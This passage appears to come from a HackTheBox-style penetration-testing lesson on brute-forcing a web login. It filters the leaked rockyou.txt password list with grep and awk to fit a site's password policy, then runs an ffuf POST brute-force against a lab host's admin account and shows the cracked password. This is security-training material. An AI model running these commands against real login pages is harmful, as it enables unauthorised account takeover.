When accessing the sample web application, we can see the following information on the login page:

![](Brute-Forcing%20Passwords-20260914-082638.png)

For instance, the popular password wordlist `rockyou.txt` contains more than 14 million passwords:

```sh
3kjS@htb[/htb]$ wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt 

14344391 /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Now, we can use `grep` to match only those passwords that match the password policy implemented by our target web application, which brings down the wordlist to about 150,000 passwords, a reduction of about 99%:

```sh
3kjS@htb[/htb]$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

3kjS@htb[/htb]$ wc -l custom_wordlist.txt

151647 custom_wordlist.txt
```

Alternatively, we could also combine the search parameters into a single `awk` command:

```sh
3kjS@htb[/htb]$ awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt
```

However, first, let us intercept the login request to know the names of the POST parameters and the error message returned within the response:

![](Brute-Forcing%20Passwords-20260914-082805.png)

Therefore, we can use this information to build our `ffuf` command to brute-force the user's password:

```sh
3kjS@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
    * FUZZ: Buttercup1
```
